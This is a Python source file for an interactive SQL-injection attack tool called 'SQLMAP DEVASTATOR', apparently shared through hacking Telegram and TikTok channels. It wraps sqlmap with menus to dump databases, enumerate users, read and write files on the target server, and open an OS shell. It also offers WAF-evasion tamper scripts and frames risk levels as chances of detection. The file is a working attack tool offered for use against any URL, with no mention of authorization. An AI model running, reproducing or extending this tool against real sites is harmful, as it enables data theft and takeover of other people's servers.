#Telegram:@le_uo      https://t.me/HackMindHQ
import os
import sys
import time
import json
import subprocess
import threading
import webbrowser
from colorama import init, Fore, Style

#Telegram:@le_uo      https://t.me/HackMindHQ


init(autoreset=True)

class SQLMapConfig:
    def __init__(self):
        self.risk = 1
        self.level = 1
        self.threads = 4
        self.batch = True
        self.random_agent = True
        self.tamper = None
        self.technique = None
        self.dbms = None

        self.tamper_scripts = [
            "apostrophemask.py", "base64encode.py", "between.py", "bluecoat.py",
            "chardoubleencode.py", "charencode.py", "charunicodeencode.py",
            "concat2concatws.py", "equaltolike.py", "greatest.py", "halfversionedmorekeywords.py",
            "ifnull2ifisnull.py", "modsecurityversioned.py", "modsecurityzeroversioned.py",
            "multiplespaces.py", "percentage.py", "randomcase.py", "randomcomments.py",
            "securesphere.py", "space2comment.py", "space2dash.py", "space2hash.py",
            "space2morehash.py", "space2mssqlblank.py", "space2mysqldash.py",
            "space2plus.py", "space2randomblank.py", "unionalltounion.py",
            "unmagicquotes.py", "versionedkeywords.py", "versionedmorekeywords.py"
        ]

        self.techniques = {
            'B': 'Boolean-based blind',
            'E': 'Error-based',
            'U': 'UNION query-based',
            'S': 'Stacked queries',
            'T': 'Time-based blind',
            'Q': 'Inline queries'
        }

        self.dbms_types = [
            'MySQL', 'Oracle', 'PostgreSQL', 'Microsoft SQL Server',
            'SQLite', 'IBM DB2', 'Firebird', 'Sybase', 'SAP MaxDB'
        ]

class AutoSQLMap:
    # Copyright (c) 2025 Mr Whoami? - TikTok: @nogkr - Telegram: @HackMindHQ
    # Unauthorized reproduction or distribution is prohibited.
    def __init__(self):
        self.target = ""
        self.output_dir = "sqlmap_results"
        self.sqlmap_path = "sqlmap"
        self.config = SQLMapConfig()

    def print_banner(self):
        banner = f"""
{Fore.GREEN}                                                                 
{Fore.GREEN}
{Fore.GREEN}     █
{Fore.GREEN}   █████
{Fore.GREEN}    █ █
{Fore.CYAN}                                                                 
{Fore.CYAN}    {Style.BRIGHT}Mr. Whoami? presents: {Fore.RED}SQLMAP DEVASTATOR{Fore.CYAN}           
{Fore.CYAN}    {Style.BRIGHT}TikTok: @nogkr | Telegram: @HackMindHQ{Fore.CYAN}                 
{Fore.RESET}                                                                 
"""
        print(banner)

    def show_main_menu(self):
        menu = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.WHITE}MAIN MENU                                                   {Fore.CYAN}║
{Fore.CYAN}╠═══════════════════════════════════════════════════════════╣
{Fore.CYAN}║ {Fore.WHITE}[1] {Fore.GREEN}Full Automatic Scan    {Fore.CYAN}| {Fore.YELLOW}Complete Site Test       {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[2] {Fore.GREEN}Database Enumeration   {Fore.CYAN}| {Fore.YELLOW}Extract DB Info          {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[3] {Fore.GREEN}Table Enumeration      {Fore.CYAN}| {Fore.YELLOW}Extract Tables           {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[4] {Fore.GREEN}Column Enumeration     {Fore.CYAN}| {Fore.YELLOW}Extract Columns          {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[5] {Fore.GREEN}Data Dumping           {Fore.CYAN}| {Fore.YELLOW}Extract Data             {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[6] {Fore.GREEN}Custom Attack          {Fore.CYAN}| {Fore.YELLOW}Advanced Options         {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[7] {Fore.GREEN}Configure Settings     {Fore.CYAN}| {Fore.YELLOW}Modify Parameters        {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[8] {Fore.GREEN}View Results           {Fore.CYAN}| {Fore.YELLOW}Show Found Data          {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[9] {Fore.GREEN}Advanced Attacks       {Fore.CYAN}| {Fore.YELLOW}OS Shell, File Read/Write{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}[10] {Fore.GREEN}Exit                   {Fore.CYAN}| {Fore.YELLOW}Quit Program             {Fore.CYAN}║
{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝{Fore.RESET}
"""
        print(menu)
        return input(f"\n{Fore.CYAN}SQLMAP DEVASTATOR {Fore.RED}> {Style.RESET_ALL}")

    def configure_attack(self):
        print(f"\n{Fore.CYAN}=== Attack Configuration ===")

        print(f"\n{Fore.YELLOW}Select Risk Level (1-3):")
        print("1 - Low risk of detection")
        print("2 - Medium risk of detection")
        print("3 - High risk of detection")
        risk = input(f"{Fore.CYAN}Risk Level [{self.config.risk}]: {Style.RESET_ALL}")
        if risk in ['1', '2', '3']:
            self.config.risk = int(risk)

        print(f"\n{Fore.YELLOW}Select Test Level (1-5):")
        print("1 - Basic tests only")
        print("3 - Medium number of tests")
        print("5 - All possible tests")
        level = input(f"{Fore.CYAN}Test Level [{self.config.level}]: {Style.RESET_ALL}")
        if level in ['1', '2', '3', '4', '5']:
            self.config.level = int(level)

        threads = input(f"\n{Fore.CYAN}Number of threads [{self.config.threads}]: {Style.RESET_ALL}")
        if threads.isdigit():
            self.config.threads = int(threads)

        print(f"\n{Fore.YELLOW}Available Tamper Scripts:")
        for i, script in enumerate(self.config.tamper_scripts, 1):
            print(f"{i}. {script}")
        script_choice = input(f"{Fore.CYAN}Select tamper script (number or name): {Style.RESET_ALL}")
        if script_choice.isdigit() and 1 <= int(script_choice) <= len(self.config.tamper_scripts):
            self.config.tamper = self.config.tamper_scripts[int(script_choice)-1]
        elif script_choice in self.config.tamper_scripts:
            self.config.tamper = script_choice

        print(f"\n{Fore.YELLOW}Available Techniques:")
        for tech, desc in self.config.techniques.items():
            print(f"{tech} - {desc}")
        tech_choice = input(f"{Fore.CYAN}Select techniques (comma-separated): {Style.RESET_ALL}")
        if tech_choice:
            self.config.technique = tech_choice.upper()

        print(f"\n{Fore.YELLOW}Available DBMS:")
        for i, dbms in enumerate(self.config.dbms_types, 1):
            print(f"{i}. {dbms}")
        dbms_choice = input(f"{Fore.CYAN}Select DBMS (number or name): {Style.RESET_ALL}")
        if dbms_choice.isdigit() and 1 <= int(dbms_choice) <= len(self.config.dbms_types):
            self.config.dbms = self.config.dbms_types[int(dbms_choice)-1]
        elif dbms_choice in self.config.dbms_types:
            self.config.dbms = dbms_choice

        print(f"\n{Fore.GREEN}[+] Configuration saved!")

    def build_sqlmap_command(self, mode=None):
        cmd = [self.sqlmap_path, '-u', self.target, '--batch']

        cmd.extend(['--risk', str(self.config.risk)])
        cmd.extend(['--level', str(self.config.level)])
        cmd.extend(['--threads', str(self.config.threads)])

        if self.config.tamper:
            cmd.extend(['--tamper', self.config.tamper])
        if self.config.technique:
            cmd.extend(['--technique', self.config.technique])
        if self.config.dbms:
            cmd.extend(['--dbms', self.config.dbms])

        if mode == 'dbs':
            cmd.append('--dbs')
        elif mode == 'tables':
            cmd.extend(['--tables', '--batch'])
        elif mode == 'columns':
            cmd.extend(['--columns', '--batch'])
        elif mode == 'dump':
            cmd.extend(['--dump', '--batch'])
        elif mode == 'full':
            cmd.extend(['--all', '--batch'])

        return cmd

    def run_sqlmap(self, cmd):
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )

            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(f"{Fore.CYAN}{output.strip()}")

            rc = process.poll()
            return rc == 0

        except Exception as e:
            print(f"{Fore.RED}[!] Error executing SQLMap: {str(e)}")
            return False

    def full_scan(self):
        if not self.target:
            print(f"{Fore.RED}[!] Please set target URL first")
            return

        print(f"{Fore.YELLOW}[*] Starting full automatic scan...")
        cmd = self.build_sqlmap_command(mode='full')
        self.run_sqlmap(cmd)

    def enumerate_databases(self):
        if not self.target:
            print(f"{Fore.RED}[!] Please set target URL first")
            return

        print(f"{Fore.YELLOW}[*] Enumerating databases...")
        cmd = self.build_sqlmap_command(mode='dbs')
        self.run_sqlmap(cmd)

    def enumerate_tables(self):
        if not self.target:
            print(f"{Fore.RED}[!] Please set target URL first")
            return

        print(f"{Fore.YELLOW}[*] Enumerating tables...")
        cmd = self.build_sqlmap_command(mode='tables')
        self.run_sqlmap(cmd)

    def enumerate_columns(self):
        if not self.target:
            print(f"{Fore.RED}[!] Please set target URL first")
            return

        print(f"{Fore.YELLOW}[*] Enumerating columns...")
        cmd = self.build_sqlmap_command(mode='columns')
        self.run_sqlmap(cmd)

    def dump_data(self):
        if not self.target:
            print(f"{Fore.RED}[!] Please set target URL first")
            return

        print(f"{Fore.YELLOW}[*] Dumping data...")
        cmd = self.build_sqlmap_command(mode='dump')
        self.run_sqlmap(cmd)

    def custom_attack(self):
        print(f"\n{Fore.CYAN}=== Custom Attack Configuration ===")
        print(f"{Fore.YELLOW}Enter additional SQLMap parameters:")
        params = input(f"{Fore.CYAN}> {Style.RESET_ALL}")

        cmd = self.build_sqlmap_command()
        if params:
            cmd.extend(params.split())

        self.run_sqlmap(cmd)

    def view_results(self):
        if not os.path.exists(self.output_dir):
            print(f"{Fore.RED}[!] No results found")
            return

        print(f"\n{Fore.CYAN}=== SQLMap Results ===")
        for root, dirs, files in os.walk(self.output_dir):
            for file in files:
                if file.endswith('.csv') or file.endswith('.txt'):
                    print(f"{Fore.GREEN}[+] {os.path.join(root, file)}")

    def advanced_attacks(self):
        print(f"\n{Fore.CYAN}=== Advanced Attack Options ===")
        print(f"{Fore.YELLOW}[1] OS Shell (Run OS commands)")
        print(f"{Fore.YELLOW}[2] Read File (Read files from target system)")
        print(f"{Fore.YELLOW}[3] Write File (Write files to target system)")
        print(f"{Fore.YELLOW}[4] Enumerate Users (Enumerate database users)")
        print(f"{Fore.YELLOW}[5] WAF Bypass (Placeholder for advanced WAF bypass module)")
        print(f"{Fore.YELLOW}[6] Back to Main Menu")

        choice = input(f"{Fore.CYAN}Select an advanced attack option: {Style.RESET_ALL}")

        if not self.target:
            print(f"{Fore.RED}[!] Please set target URL first")
            return

        if choice == '1':
            self.os_shell()
        elif choice == '2':
            self.read_file()
        elif choice == '3':
            self.write_file()
        elif choice == '4':
            self.enumerate_users()
        elif choice == '5':
            print(f"{Fore.YELLOW}[*] WAF Bypass module is under development. Coming soon!")
        elif choice == '6':
            return
        else:
            print(f"{Fore.RED}[!] Invalid option")

    def os_shell(self):
        print(f"{Fore.YELLOW}[*] Attempting to get OS shell...")
        cmd = self.build_sqlmap_command()
        cmd.extend(["--os-shell"])
        self.run_sqlmap(cmd)

    def read_file(self):
        file_path = input(f"{Fore.CYAN}Enter absolute path of the file to read: {Style.RESET_ALL}")
        if not file_path:
            print(f"{Fore.RED}[!] File path cannot be empty.")
            return
        print(f"{Fore.YELLOW}[*] Attempting to read file: {file_path}...")
        cmd = self.build_sqlmap_command()
        cmd.extend(["--file-read", file_path])
        self.run_sqlmap(cmd)

    def write_file(self):
        local_file = input(f"{Fore.CYAN}Enter local file path to upload: {Style.RESET_ALL}")
        remote_path = input(f"{Fore.CYAN}Enter remote path to write the file: {Style.RESET_ALL}")
        if not local_file or not remote_path:
            print(f"{Fore.RED}[!] Local file and remote path cannot be empty.")
            return
        if not os.path.exists(local_file):
            print(f"{Fore.RED}[!] Local file not found: {local_file}")
            return
        print(f"{Fore.YELLOW}[*] Attempting to write file {local_file} to {remote_path}...")
        cmd = self.build_sqlmap_command()
        cmd.extend(["--file-write", local_file, "--file-dest", remote_path])
        self.run_sqlmap(cmd)

    def enumerate_users(self):
        print(f"{Fore.YELLOW}[*] Enumerating database users...")
        cmd = self.build_sqlmap_command()
        cmd.extend(["--users"])
        self.run_sqlmap(cmd)

    def run(self):
        try:
            self.print_banner()

            # Check for sqlmap installation
            try:
                subprocess.run([self.sqlmap_path, "--version"], check=True, capture_output=True)
            except FileNotFoundError:
                print(f"{Fore.RED}[!] SQLMap not found. Please install SQLMap first.")
                return
            except subprocess.CalledProcessError as e:
                print(f"{Fore.RED}[!] Error checking SQLMap version: {e.stderr.strip()}")
                return

            while True:
                choice = self.show_main_menu()

                if not self.target and choice not in ["7", "8", "9", "10"]:
                    self.target = input(f"{Fore.CYAN}Enter target URL: {Style.RESET_ALL}")
                    if not self.target:
                        print(f"{Fore.RED}[!] Target URL is required")
                        continue

                if choice == "1":
                    self.full_scan()
                elif choice == "2":
                    self.enumerate_databases()
                elif choice == "3":
                    self.enumerate_tables()
                elif choice == "4":
                    self.enumerate_columns()
                elif choice == "5":
                    self.dump_data()
                elif choice == "6":
                    self.custom_attack()
                elif choice == "7":
                    self.configure_attack()
                elif choice == "8":
                    self.view_results()
                elif choice == "9":
                    self.advanced_attacks() # New option for advanced attacks
                elif choice == "10":
                    print(f"{Fore.GREEN}[+] Thanks for using SQLMAP DEVASTATOR!")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid option")

                input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Operation cancelled by user")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Fatal error: {str(e)}")

def main():
    try:
        sqlmap = AutoSQLMap()
        sqlmap.run()
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}")

if __name__ == "__main__":
    main()




# Copyright (c) 2025 Mr Whoami? - TikTok: @nogkr - Telegram: @HackMindHQ
# All rights reserved.




# Copyright (c) 2025 Mr Whoami? - TikTok: @nogkr - Telegram: @HackMindHQ
# This tool is a creation of Mr Whoami? for advanced SQL injection.




